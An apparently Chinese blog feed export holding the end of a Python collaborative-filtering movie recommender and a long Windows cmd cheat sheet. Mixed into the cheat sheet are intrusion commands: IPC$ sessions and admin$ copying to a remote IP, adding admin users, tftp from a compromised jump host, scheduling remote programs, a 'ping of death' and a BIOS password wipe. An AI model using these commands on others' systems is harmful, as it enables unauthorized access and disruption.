class="line">#</span><br><span class="line">#   生成用户评分的数据结构</span><br><span class="line">#   </span><br><span class="line">#   输入:所以数据 [[2,1,5],[2,4,2]...]</span><br><span class="line">#   输出:1.用户打分字典 2.电影字典</span><br><span class="line">#   使用字典，key是用户id，value是用户对电影的评价，</span><br><span class="line">#   rate_dic[2]=[(1,5),(4,2)].... 表示用户2对电影1的评分是5，对电影4的评分是2</span><br><span class="line"></span><br><span class="line">def createUserRankDic(rates):</span><br><span class="line">    user_rate_dic=&#123;&#125;</span><br><span class="line">    item_to_user=&#123;&#125;</span><br><span class="line">    for i in rates:</span><br><span class="line">        user_rank=(i[1],i[2])</span><br><span class="line">        if i[0] in user_rate_dic:</span><br><span class="line">            user_rate_dic[i[0]].append(user_rank)</span><br><span class="line">        else:</span><br><span class="line">            user_rate_dic[i[0]]=[user_rank]</span><br><span class="line"></span><br><span class="line">        if i[1] in item_to_user:</span><br><span class="line">            item_to_user[i[1]].append(i[0])</span><br><span class="line">        else:</span><br><span class="line">            item_to_user[i[1]]=[i[0]]</span><br><span class="line"></span><br><span class="line">    return user_rate_dic,item_to_user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   计算与指定用户最相近的邻居</span><br><span class="line">#   输入:指定用户ID，所以用户数据，所以物品数据</span><br><span class="line">#   输出:与指定用户最相邻的邻居列表</span><br><span class="line">#</span><br><span class="line">def calcNearestNeighbor(userid,users_dic,item_dic):</span><br><span class="line">    neighbors=[]</span><br><span class="line">    #neighbors.append(userid)</span><br><span class="line">    for item in users_dic[userid]:</span><br><span class="line">        for neighbor in item_dic[item[0]]:</span><br><span class="line">            if neighbor != userid and neighbor not in neighbors: </span><br><span class="line">                neighbors.append(neighbor)</span><br><span class="line"></span><br><span class="line">    neighbors_dist=[]</span><br><span class="line">    for neighbor in neighbors:</span><br><span class="line">        dist=calcSimlaryCosDist(users_dic[userid],users_dic[neighbor])  #calcSimlaryCosDist  calcCosDist calcCosDistSpe</span><br><span class="line">        neighbors_dist.append([dist,neighbor])</span><br><span class="line">    neighbors_dist.sort(reverse=True)</span><br><span class="line">    #print neighbors_dist</span><br><span class="line">    return  neighbors_dist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   使用UserFC进行推荐</span><br><span class="line">#   输入：文件名,用户ID,邻居数量</span><br><span class="line">#   输出：推荐的电影ID,输入用户的电影列表,电影对应用户的反序表，邻居列表</span><br><span class="line">#</span><br><span class="line">def recommendByUserFC(file_name,userid,k=5):</span><br><span class="line"></span><br><span class="line">    #读取文件数据</span><br><span class="line">    test_contents=readFile(file_name)</span><br><span class="line"></span><br><span class="line">    #文件数据格式化成二维数组 List[[用户id,电影id,电影评分]...] </span><br><span class="line">    test_rates=getRatingInformation(test_contents)</span><br><span class="line"></span><br><span class="line">    #格式化成字典数据 </span><br><span class="line">    #    1.用户字典：dic[用户id]=[(电影id,电影评分)...]</span><br><span class="line">    #    2.电影字典：dic[电影id]=[用户id1,用户id2...]</span><br><span class="line">    test_dic,test_item_to_user=createUserRankDic(test_rates)</span><br><span class="line"></span><br><span class="line">    #寻找邻居</span><br><span class="line">    neighbors=calcNearestNeighbor(userid,test_dic,test_item_to_user)[:k]</span><br><span class="line"></span><br><span class="line">    recommend_dic=&#123;&#125;</span><br><span class="line">    for neighbor in neighbors:</span><br><span class="line">        neighbor_user_id=neighbor[1]</span><br><span class="line">        movies=test_dic[neighbor_user_id]</span><br><span class="line">        for movie in movies:</span><br><span class="line">            #print movie</span><br><span class="line">            if movie[0] not in recommend_dic:</span><br><span class="line">                recommend_dic[movie[0]]=neighbor[0]</span><br><span class="line">            else:</span><br><span class="line">                recommend_dic[movie[0]]+=neighbor[0]</span><br><span class="line">    #print len(recommend_dic)</span><br><span class="line"></span><br><span class="line">    #建立推荐列表</span><br><span class="line">    recommend_list=[]</span><br><span class="line">    for key in recommend_dic:</span><br><span class="line">        #print key</span><br><span class="line">        recommend_list.append([recommend_dic[key],key])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    recommend_list.sort(reverse=True)</span><br><span class="line">    #print recommend_list</span><br><span class="line">    user_movies = [ i[0] for i in test_dic[userid]]</span><br><span class="line"></span><br><span class="line">    return [i[1] for i in recommend_list],user_movies,test_item_to_user,neighbors</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#   获取电影的列表</span><br><span class="line"></span><br><span class="line">def getMoviesList(file_name):</span><br><span class="line">    #print sys.getdefaultencoding()</span><br><span class="line">    movies_contents=readFile(file_name)</span><br><span class="line">    movies_info=&#123;&#125;</span><br><span class="line">    for movie in movies_contents:</span><br><span class="line">        movie_info=movie.split(&quot;|&quot;)</span><br><span class="line">        movies_info[int(movie_info[0])]=movie_info[1:]</span><br><span class="line">    return movies_info</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#主程序</span><br><span class="line">#输入 ： 测试数据集合</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    reload(sys)</span><br><span class="line">    sys.setdefaultencoding(&apos;utf-8&apos;)</span><br><span class="line">    movies=getMoviesList(&quot;/Users/wuyinghao/Downloads/ml-100k/u.item&quot;)</span><br><span class="line">    recommend_list,user_movie,items_movie,neighbors=recommendByUserFC(&quot;/Users/wuyinghao/Downloads/ml-100k/u.data&quot;,179,80)</span><br><span class="line">    neighbors_id=[ i[1] for i in neighbors]</span><br><span class="line">    table = Texttable()</span><br><span class="line">    table.set_deco(Texttable.HEADER)</span><br><span class="line">    table.set_cols_dtype([&apos;t&apos;,  # text </span><br><span class="line">                          &apos;t&apos;,  # float (decimal)</span><br><span class="line">                          &apos;t&apos;]) # automatic</span><br><span class="line">    table.set_cols_align([&quot;l&quot;, &quot;l&quot;, &quot;l&quot;])</span><br><span class="line">    rows=[]</span><br><span class="line">    rows.append([u&quot;movie name&quot;,u&quot;release&quot;, u&quot;from userid&quot;])</span><br><span class="line">    for movie_id in recommend_list[:20]:</span><br><span class="line">        from_user=[]</span><br><span class="line">        for user_id in items_movie[movie_id]:</span><br><span class="line">            if user_id in neighbors_id:</span><br><span class="line">                from_user.append(user_id)</span><br><span class="line">        rows.append([movies[movie_id][0],movies[movie_id][1],&quot;&quot;])</span><br><span class="line">    table.add_rows(rows)</span><br><span class="line">    print table.draw()</span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line">结果</span><br><span class="line">movie name                release     </span><br><span class="line">=======================================================</span><br><span class="line">Contact (1997)                11-Jul-1997               </span><br><span class="line">Scream (1996)                 20-Dec-1996               </span><br><span class="line">Liar Liar (1997)              21-Mar-1997               </span><br><span class="line">Saint, The (1997)             14-Mar-1997               </span><br><span class="line">English Patient, The (1996)   15-Nov-1996               </span><br><span class="line">Titanic (1997)                01-Jan-1997               </span><br><span class="line">Air Force One (1997)          01-Jan-1997               </span><br><span class="line">Star Wars (1977)              01-Jan-1977               </span><br><span class="line">Conspiracy Theory (1997)      08-Aug-1997               </span><br><span class="line">Toy Story (1995)              01-Jan-1995               </span><br><span class="line">Fargo (1996)                  14-Feb-1997</span><br></pre>      </td>    </tr>  </table></figure><p>数据集： <a href="http://files.grouplens.org/datasets/movielens/" rel="external nofollow noopener noreferrer" target="_blank">http://files.grouplens.org/datasets/movielens/</a></p><p>下载ml-100k.zip即可</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;协同过滤算法:&lt;a href=&quot;https://blog.csdn.net/DanyHgc/article/details/78910379&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;参考&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;https://github.com/starstarb/clouding/raw/master/head/39c919dcb1e7359106750713718e02a4.jpg&quot; alt&gt;
&lt;/p&gt;
    
    </summary>
    
      <category term="算法" scheme="http://javastar.club/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="python" scheme="http://javastar.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>cmd快捷键</title>
    <link href="http://javastar.club/archives/d63050d8.html"/>
    <id>http://javastar.club/archives/d63050d8.html</id>
    <published>2019-08-10T02:58:29.000Z</published>
    <updated>2019-08-10T03:01:44.313Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://github.com/starstarb/clouding/raw/master/picture/5.jpg" alt></p><a id="more"></a><p>CMD命令：开始－&gt;运行－&gt;键入cmd或command（在命令行里可以看到系统版本、文件系统版本）<br>chcp  修改默认字符集<br>chcp 936默认中文<br>chcp 65001</p><ol>  <li>appwiz.cpl：程序和功能 </li>  <li>calc：启动计算器 </li></ol><ol start="5">  <li>    <p>chkdsk.exe：Chkdsk磁盘检查（管理员身份运行命令提示符） </p>  </li>  <li>    <p>cleanmgr: 打开磁盘清理工具 </p>  </li></ol><ol start="9">  <li>    <p>cmd.exe：CMD命令提示符 </p>  </li>  <li>    <p>自动关机命令<br>　 Shutdown -s -t 600：表示600秒后自动关机<br>　 shutdown -a ：可取消定时关机<br>　      Shutdown -r -t 600：表示600秒后自动重启      　</p>  </li>  <li>    <p>CompMgmtLauncher：计算机管理 </p>  </li>  <li>    <p>compmgmt.msc：计算机管理 </p>  </li>  <li>    <p>credwiz：备份或还原储存的用户名和密码 </p>  </li>  <li>    <p>control：控制面版 </p>  </li>  <li>    <p>dcomcnfg：打开系统组件服务 </p>  </li>  <li>    <p>devmgmt.msc：设备管理器 </p>  </li>  <li>    <p>desk.cpl：屏幕分辨率 </p>  </li>  <li>    <p>dfrgui：优化驱动器 Windows 7→dfrg.msc：磁盘碎片整理程序 </p>  </li>  <li>    <p>dialer：电话拨号程序 </p>  </li>  <li>    <p>diskmgmt.msc：磁盘管理 </p>  </li>  <li>    <p>dvdplay：DVD播放器 </p>  </li>  <li>    <p>dxdiag：检查DirectX信息 </p>  </li>  <li>    <p>eudcedit：造字程序 </p>  </li>  <li>    <p>eventvwr：事件查看器 </p>  </li>  <li>    <p>explorer：打开资源管理器 </p>  </li>  <li>    <p>Firewall.cpl：Windows防火墙 </p>  </li>  <li>    <p>fsmgmt.msc：共享文件夹管理器 </p>  </li>  <li>    <p>gpedit.msc：组策略 </p>  </li>  <li>    <p>hdwwiz.cpl：设备管理器 </p>  </li>  <li>    <p>inetcpl.cpl：Internet属性 </p>  </li>  <li>    <p>intl.cpl：区域 </p>  </li>  <li>    <p>iexpress：木马捆绑工具，系统自带 </p>  </li>  <li>    <p>joy.cpl：游戏控制器 </p>  </li>  <li>    <p>logoff：注销命令 </p>  </li>  <li>    <p>lusrmgr.msc：本地用户和组 </p>  </li>  <li>    <p>lpksetup：语言包安装/删除向导，安装向导会提示下载语言包 </p>  </li>  <li>    <p>lusrmgr.msc：本机用户和组 </p>  </li>  <li>    <p>main.cpl：鼠标属性 </p>  </li>  <li>    <p>mmsys.cpl：声音 </p>  </li>  <li>    <p>mem.exe：显示内存使用情况（如果直接运行无效，可以先管理员身份运行命令提示符，在命令提示符里输入mem.exe&gt;d:a.txt      即可打开d盘查看a.txt，里面的就是内存使用情况了。当然什么盘什么文件名可自己决定。） </p>  </li></ol><ol start="47">  <li>    <p>mmc：打开控制台 </p>  </li>  <li>    <p>mobsync：同步命令 </p>    <ol start="50">      <li>Msconfig.exe：系统配置实用程序 </li>    </ol>  </li>  <li>    <p>msdt：微软支持诊断工具 </p>  </li>  <li>    <p>msinfo32：系统信息 </p>  </li>  <li>    <p>mspaint：画图 </p>  </li>  <li>    <p>Msra：Windows远程协助 </p>  </li>  <li>    <p>mstsc：远程桌面连接 </p>  </li>  <li>    <p>NAPCLCFG.MSC：客户端配置 </p>  </li>  <li>    <p>ncpa.cpl：网络连接 </p>  </li>  <li>    <p>narrator：屏幕“讲述人” </p>  </li>  <li>    <p>Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项 </p>  </li>  <li>    <p>netstat : an(TC)命令检查接口 </p>  </li>  <li>    <p>notepad：打开记事本 </p>  </li>  <li>    <p>Nslookup：IP地址侦测器 </p>  </li>  <li>    <p>odbcad32：ODBC数据源管理器 </p>  </li>  <li>    <p>OptionalFeatures：打开“打开或关闭Windows功能”对话框 </p>  </li></ol><ol start="65">  <li>osk：打开屏幕键盘 </li>  <li>perfmon.msc：计算机性能监测器 </li>  <li>perfmon：计算机性能监测器 </li>  <li>PowerShell：提供强大远程处理能力 </li>  <li>printmanagement.msc：打印管理 </li>  <li>powercfg.cpl：电源选项 </li>  <li>psr：问题步骤记录器 </li>  <li>Rasphone：网络连接 </li>  <li>Recdisc：创建系统修复光盘 </li>  <li>Resmon：资源监视器 </li>  <li>Rstrui：系统还原 </li>  <li>regedit.exe：注册表 </li>  <li>regedt32：注册表编辑器 </li>  <li>rsop.msc：组策略结果集 </li>  <li>sdclt：备份状态与配置，就是查看系统是否已备份 </li>  <li>secpol.msc：本地安全策略 </li>  <li>services.msc：本地服务设置 </li>  <li>sfc /scannow：扫描错误并复原/windows文件保护 </li>  <li>sfc.exe：系统文件检查器 </li>  <li>shrpubw：创建共享文件夹 </li>  <li>sigverif：文件签名验证程序 </li>  <li>slui：Windows激活，查看系统激活信息 </li>  <li>slmgr.vbs -dlv ：显示详细的许可证信息<br>　 slmgr.vbs -dli ：显示许可证信息<br>　 slmgr.vbs    -xpr ：当前许可证截止日期<br>　 slmgr.vbs -dti ：显示安装ID 以进行脱机激<br>　 slmgr.vbs -ipk    ：(Product Key)安装产品密钥<br>　 slmgr.vbs -ato ：激活Windows<br>　 slmgr.vbs -cpky    ：从注册表中清除产品密钥（防止泄露引起的攻击）<br>　 slmgr.vbs -ilc ：(License file)安装许可证<br>　    slmgr.vbs -upk ：卸载产品密钥<br>　 slmgr.vbs -skms ：(name[ort] )批量授权 </li>  <li>snippingtool：截图工具，支持无规则截图 </li>  <li>soundrecorder：录音机，没有录音时间的限制 </li>  <li>StikyNot：便笺 </li>  <li>sysdm.cpl：系统属性 </li>  <li>sysedit：系统配置编辑器 </li>  <li>syskey：系统加密，一旦加密就不能解开，保护系统的双重密码 </li>  <li>taskmgr：任务管理器（旧版） </li>  <li>TM任务管理器（新版） </li>  <li>taskschd.msc：任务计划程序 </li>  <li>timedate.cpl：日期和时间 </li>  <li>UserAccountControlSettings用户账户控制设置 </li>  <li>utilman：辅助工具管理器 </li>  <li>wf.msc：高级安全Windows防火墙 </li>  <li>WFS：Windows传真和扫描 </li>  <li>wiaacmgr：扫描仪和照相机向导 </li>  <li>winver：关于Windows <ol start="104">      <li>wmimgmt.msc：打开windows管理体系结构(WMI) </li>      <li>write：写字板 </li>    </ol>  </li>  <li>wscui.cpl：操作中心 </li>  <li>wscript：windows脚本宿主设置 </li>  <li>wuapp：Windows更新</li></ol><p>　　1. gpedit.msc—–组策略</p><p>　　2. sndrec32——-录音机</p><p>　　3. Nslookup——-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows  NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。</p><p>　　4. explorer——-打开资源管理器 </p><p>　　5. logoff———注销命令</p><p>　　6. shutdown——-60秒倒计时关机命令</p><p>　　7. lusrmgr.msc—-本机用户和组</p><p>　　8. services.msc—本地服务设置</p><p>　　9. oobe/msoobe /a—-检查XP是否激活</p><p>　　10. notepad——–打开记事本 </p><p>　　11. cleanmgr——-垃圾整理</p><p>　　12. net start messenger—-开始信使服务</p><p>　　13. compmgmt.msc—计算机管理</p><p>　　14. net stop messenger—–停止信使服务</p><p>　　15. conf———–启动netmeeting</p><p>　　16. dvdplay——–DVD播放器</p><p>　　17. charmap——–启动字符映射表</p><p>　　18. diskmgmt.msc—磁盘管理实用程序</p><p>　　19. calc———–启动计算器</p><p>　　20. dfrg.msc——-磁盘碎片整理程序</p><p>　　21. chkdsk.exe—–Chkdsk磁盘检查</p><p>　　22. devmgmt.msc— 设备管理器 </p><p>　　23. regsvr32 /u *.dll—-停止dll文件运行</p><p>　　24. drwtsn32—— 系统医生</p><p>　　25. rononce -p—-15秒关机</p><p>　　26. dxdiag———检查DirectX信息</p><p>　　27. regedt32——-注册表编辑器 </p><p>　　28. Msconfig.exe—系统配置实用程序</p><p>　　29. rsop.msc——-组策略结果集</p><p>　　30. mem.exe——–显示内存使用情况</p><p>　　31. regedit.exe—-注册表</p><p>　　32. winchat——–XP自带局域网聊天</p><p>　　33. progman——–程序管理器</p><p>　　34. winmsd———系统信息</p><p>　　35. perfmon.msc—-计算机性能监测程序</p><p>　　36. winver———检查Windows版本</p><p>　　37. sfc /scannow—–扫描错误并复原</p><p>　　38. taskmgr—–任务管理器（2000/xp/2003</p><p>　　39. winver———检查Windows版本</p><p>　　40. wmimgmt.msc—-打开windows管理体系结构(WMI)</p><p>　　41. wupdmgr——–windows更新程序</p><p>　　42. wscript——–windows脚本宿主设置</p><p>　　43. write———-写字板</p><p>　　44. winmsd———系统信息</p><p>　　45. wiaacmgr——-扫描仪和照相机向导</p><p>　　46. winchat——–XP自带局域网聊天</p><p>　　47. mem.exe——–显示内存使用情况</p><p>　　48. Msconfig.exe—系统配置实用程序</p><p>　　49. mplayer2——-简易widnows media player</p><p>　　50. mspaint——–画图板</p><p>　　51. mstsc———-远程桌面连接</p><p>　　52. mplayer2——-媒体播放机</p><p>　　53. magnify——–放大镜实用程序</p><p>　　54. mmc————打开控制台</p><p>　　55. mobsync——–同步命令</p><p>　　56. dxdiag———检查DirectX信息</p><p>　　57. iexpress——-木马捆绑工具，系统自带 58. fsmgmt.msc—–共享文件夹管理器</p><p>　　59. utilman——–辅助工具管理器</p><p>　　60. diskmgmt.msc—磁盘管理实用程序</p><p>　　61. dcomcnfg——-打开系统组件服务</p><p>　　62. ddeshare——-打开DDE共享设置</p><p>　　110. osk————打开屏幕键盘 </p><p>　　111. odbcad32——-ODBC数据源管理器</p><p>　　112. oobe/msoobe /a—-检查XP是否激活 114. logoff———注销命令</p><p>　　66. notepad——–打开记事本</p><p>　　67. nslookup——-网络管理的工具向导</p><p>　　68. ntbackup——-系统备份和还原</p><p>　　69. narrator——-屏幕“讲述人”</p><p>　　70. ntmsmgr.msc—-移动存储管理器</p><p>　　71. ntmsoprq.msc—移动存储管理员操作请求</p><p>　　72. netstat -an—-(TC)命令检查接口</p><p>　　73. syncapp——–创建一个公文包</p><p>　　74. sysedit——–系统配置编辑器</p><p>　　75. sigverif——-文件签名验证程序</p><p>　　76. ciadv.msc——索引服务程序</p><p>　　77. shrpubw——–创建共享文件夹</p><p>　　78. secpol.msc—–本地安全策略</p><p>　　79. syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码</p><p>　　80. services.msc—本地服务设置</p><p>　　81. Sndvol32——-音量控制程序</p><p>　　82. sfc.exe——–系统文件检查器</p><p>　　83. sfc /scannow—windows文件保护</p><p>　　84. ciadv.msc——索引服务程序</p><p>　　85. tourstart——xp简介（安装完成后出现的漫游xp程序）</p><p>　　86. taskmgr——–任务管理器</p><p>　　87. eventvwr——-事件查看器</p><p>　　88. eudcedit——-造字程序</p><p>　　89. compmgmt.msc—计算机管理</p><p>　　90. packager——-对象包装程序</p><p>　　91. perfmon.msc—-计算机性能监测程序</p><p>　　92. charmap——–启动字符映射表</p><p>　　93. cliconfg——-SQL SERVER 客户端网络实用程序</p><p>　　94. Clipbrd——–剪贴板查看器</p><p>　　95. conf———–启动netmeeting</p><p>　　96. certmgr.msc—-证书管理实用程序</p><p>　　97. regsvr32 /u *.dll—-停止dll文件运行</p><p>　　98. regsvr32 /u zipfldr.dll——取消ZIP支持</p><p>　　99. cmd.exe——–CMD命令提示符</p><p>　　100. chkdsk.exe—–Chkdsk磁盘检查</p><p>1.磁盘操作，<br>　　fdisk 隐含 参数 /mbr 重建主引导记录fdisk /mbr 重建主引导记录<br>　　fdisk  在DOS7.0以后增加了/cmbr参数，可在挂接多个物理硬盘时，重建排序在后面的硬盘的主引导记录，例如：fdisk /cmbr  2，可重写第二个硬盘的主引导记录。（在使用时要十分小心，避免把好的硬盘引导记录损坏）<br>　　format 参数： /q 快速格式化 /u 不可恢复  /autotest 不提示 /s 创建 MS-DOS 引导盘 format c: /q /u /autotest<br>2.目录操作<br>　　DIR  [目录名或文件名] [/S][/W][/P][/A] 列出目录 参数: /s 查找子目录/w 只显示文件名 /p 分页/a 显示隐藏文件 DIR  format.exe /s查找该盘的format.exe文件并报告位置<br>　　MD (MKDIR) [目录名] 创建目录 MKDIR  HELLOWORLD 创建HELLOWORLD目录<br>　　CD (CHDIR) [目录名] PS:可以使用相对目录或绝对目录 进入目录 CD AA  进入当前文件夹下的AA目录,cd .. 进入上一个文件夹cd \返回根目录;cd c:\windows 进入c:\windows文件夹<br>　　RD (  RMDIR) [目录名] 删除目录 RD HELLOWORLD 删除HELLOWORLD目录<br>3.文件操作<br>　　删除目录及其文件： rmdir  [目录名或文件名] [/S][/W][/P][/A] 。例 rmdir c:\qqdownload/s  删除C盘的qqdownload目录。<br>　　del [目录名或文件名] [/f][/s][/q] 删除 参数:/f 删除只读文件/s  删除该目录及其下的所有内容 /q 删除前不确认<br>　　del c:\del /s /q 自动删除c盘的del目录。<br>　　copy [源文件或目录]  [目标目录] 复制文件 copy d:\pwin98*.* c:\presetup  将d盘的pwin98的所有文件复制到c盘的presetup下。<br>　　attrib [参数][源文件或目录]  文件属性操作命令，attrib命令可以列出或修改磁盘上文件的属性，文件属性包括文档（A）、只读(R)、隐藏(H)、系统(S)，例如：attrib -h -r  -s io.sys  执行这一命令后，将把DOS系统文件io.sys文件的只读、隐藏、系统属性去掉，这时将可以直接通过dir命令看到io.sys文件。attrib +h +r  +s autoexec.bat将为自动批处理文件增加以上属性。<br>4.内存操作<br>　　debug 调试内存 参数 -w [文件名] 写入二进制文件  -o [地址1] [地址2] 输出内存 -q 退出 exp:o 70 10[return] o 71 01<br>　　[return] 01[return]  q[return] DOS下通过写70h/71h PORT改变BIOS密码在CMOS中存放的对应位置的值,用以清除AWARD BIOS密码.debug  还可以破解硬盘保护卡等,但只可以在纯DOS下用。<br>5.分区操作<br>　　给磁盘分区，一般都会分成四个区，磁盘分区由主分区、扩展分区、逻辑分区组成。<br>　　PQ和Acronis  Disk Director这两个工具都可以在不丢失数据的情况下对分区进行调整大小，以及合并等操作，XP系统的话你用PQ，WIN7系统的话用Acronis  Disk Director  操作基本一样，可以去网上找教程来看看，再不重装系统的情况下都能调整分区大小，但是建议你还是先备份下数据再调整，毕竟对硬盘直接进行的操作有一定的危险性。</p><p>　　net use ipipc$ “ “ /user:” “ 建立IPC空链接</p><p>　　net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接</p><p>　　net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:</p><p>　　net use h: ipc$ 登陆后映射对方C：到本地为H:</p><p>　　net use ipipc$ /del 删除IPC链接</p><p>　　net use h: /del 删除映射对方到本地的为H:的映射</p><p>　　net user 用户名　密码　/add 建立用户</p><p>　　net user guest /active:yes 激活guest用户</p><p>　　net user 查看有哪些用户</p><p>　　net user 帐户名 查看帐户的属性</p><p>　　net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限</p><p>　　net start 查看开启了哪些服务</p><p>　　net start 服务名　开启服务；(如:net start telnet， net start schedule)</p><p>　　net stop 服务名 停止某服务</p><p>　　net time 目标ip 查看对方时间</p><p>　　net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息</p><p>　　net view 查看本地局域网内开启了哪些共享</p><p>　　net view ip 查看对方局域网内开启了哪些共享</p><p>　　net config 显示系统网络设置</p><p>　　net logoff 断开连接的共享</p><p>　　net pause 服务名 暂停某服务</p><p>　　net send ip “文本信息” 向对方发信息</p><p>　　net ver 局域网内正在使用的网络连接类型和信息</p><p>　　net share 查看本地开启的共享</p><p>　　net share ipc$ 开启ipc$共享</p><p>　　net share ipc$ /del 删除ipc$共享</p><p>　　net share c$ /del 删除C：共享</p><p>　　net user guest 12345 用guest用户登陆后用将密码改为12345</p><p>　　net password 密码 更改系统登陆密码</p><p>　　netstat -a 查看开启了哪些端口,常用netstat -an</p><p>　　netstat -n 查看端口的网络连接情况，常用netstat -an</p><p>　　netstat -v 查看正在进行的工作</p><p>　　netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况</p><p>　　netstat -s 查看正在使用的所有协议使用情况</p><p>　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名</p><p>　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</p><p>　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。</p><p>　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)</p><p>　　ipconfig (winipcfg) 用于windows NT及XP(windows 95  98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息</p><p>　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p><p>　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p><p>　　del -F 文件名  加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR  <em>.</em>”表示删除当前目录下所有只读文件，“DEL/A-S <em>.</em>”表示删除当前目录下除系统文件以外的所有文件</p><p>　　del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q  可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</p><p>　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</p><p>　　fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt;  &gt;” 是重定向命令</p><p>　　at id号 开启已注册的某个计划任务</p><p>　　at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止</p><p>　　at id号 /delete 停止某个已注册的计划任务</p><p>　　at 查看所有的计划任务</p><p>　　at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机</p><p>　　finger username @host 查看最近有哪些用户登陆</p><p>　　telnet ip 端口 远和登陆服务器,默认端口为23</p><p>　　open ip 连接到IP（属telnet登陆后的命令）</p><p>　　telnet 在本机上直接键入telnet 将进入本机的telnet</p><p>　　copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件</p><p>　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下</p><p>　　copy 1st.jpg/b+2st.txt/a 3st.jpg  将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件</p><p>　　copy ipadmin$svv.exe c: 或:copyipadmin$<em>.</em>  复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</p><p>　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件</p><p>　　用参数/e才可连目录下的子目录一起复制到目标地址下。</p><p>　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exec:server.exe  登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i  则以ASCII模式（传送文本文件模式）进行传送</p><p>　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机</p><p>　　ftp ip 端口  用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</p><p>　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway  addres，接口地址Interface</p><p>　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息</p><p>　　start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令</p><p>　　mem 查看cpu使用情况</p><p>　　attrib 文件名(目录名) 查看某文件（目录）的属性</p><p>　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</p><p>　　dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间</p><p>　　date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间</p><p>　　set 指定环境变量名称=要指派给变量的字符 设置环境变量</p><p>　　set 显示当前所有的环境变量</p><p>　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</p><p>　　pause 暂停批处理程序，并显示出：请按任意键继续….</p><p>　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）</p><p>　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</p><p>　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）</p><p>　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</p><p>　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置</p><p>　　echo 信息 在屏幕上显示出信息</p><p>　　echo 信息 